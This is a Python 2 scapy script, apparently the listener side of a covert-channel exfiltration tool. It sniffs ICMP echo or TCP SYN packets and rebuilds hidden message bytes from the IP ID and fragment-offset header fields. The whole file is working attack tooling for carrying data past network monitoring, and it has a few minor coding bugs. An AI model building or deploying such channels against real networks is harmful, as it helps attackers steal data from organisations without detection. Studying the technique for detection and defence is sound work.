#!/usr/bin/env python2

import argparse
import enum
import logging
import random
import sys

from scapy.all import *

l = logging.getLogger('data_exfil_server')

class MessageType(enum.Enum):
    ICMP = 0
    TCP = 1

def parse_exfiltration_packet(pkt):
    ip_id = pkt.id

    id = ip_id & 0xFF
    byte = (ip_id >> 8) & 0xFF

    ip_frag = pkt.frag

    byte_offset = ip_frag & 0xFF

    is_last = ((ip_frag >> 12) & 0x1) == 1

    return id, byte, byte_offset, is_last


messages = {}
sizes = {}
def process_packet(pkt):
    l.debug("Processing packet {}".format(pkt))
    id, byte, byte_offset, is_last = parse_exfiltration_packet(pkt)

    l.debug("Got id {} byte {} byte_offset {} is_last {}".format(id, byte, byte_offset, is_last))

    if not id in messages:
        messages[id] = {}

    if not is_last:
        messages[id][byte_offset] = chr(byte)
    else:
        sizes[id] = byte_offset


def message_type_to_filter(message_type):
    if message_type == MessageType.ICMP:
        return "icmp"
    elif message_type == MessageType.TCP:
        return "(tcp[tcpflags] & (tcp-syn) != 0 and dst port 80) or ip"
    else:
        l.error("Invalid message type {}, couldn't create a filter".filter(message_type))
        assert(False)

def is_last_packet(pkt):
    id, byte, byte_offset, is_last = parse_exfiltration_packet(pkt)
    return is_last

def receive_message(ip_address, interface, message_type):

    filter = "dst host {} and ({})".format(ip_address, message_type_to_filter(message_type))
    l.debug("going to sniff interface {} with filter {}".format(interface, filter))

    pkts = sniff(filter=filter, iface=interface, prn=process_packet, stop_filter=is_last_packet)

    assert(len(messages.keys()) == 1)
    id = messages.keys()[0]

    total_size = sizes[id]
    
    # ensure recieved all bytes
    if total_size != len(messages[id]):
        l.error("Missing all bytes, only recieved", len(messages[id]))
        sys.exit(-1)

    recieved_bytes = messages[id].items()
    recieved_bytes.sort()
    message = "".join([a[1] for a in recieved_bytes])
    print(message)
        


if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog="data_exfil_server")
    parser.add_argument("ip_address", type=str, help="IP address to list for message")
    parser.add_argument("interface", type=str, help="interface to sniff for message")
    parser.add_argument("type", type=int, help="type of message to look for, 0 for ICMP echo, 1 for TCP SYN packet")
    parser.add_argument("--debug", action="store_true", help="Enable debugging")

    logging.basicConfig()

    args = parser.parse_args()

    mesasge_type = None

    if args.type == 0:
        message_type = MessageType.ICMP
    elif args.type == 1:
        message_type = MessageType.TCP
    else:
        parser.print_help()
        sys.exit(-1)

    if args.debug:
        l.setLevel(logging.DEBUG)
    else:
        l.setLevel(logging.WARN)

    receive_message(args.ip_address, args.interface, message_type)
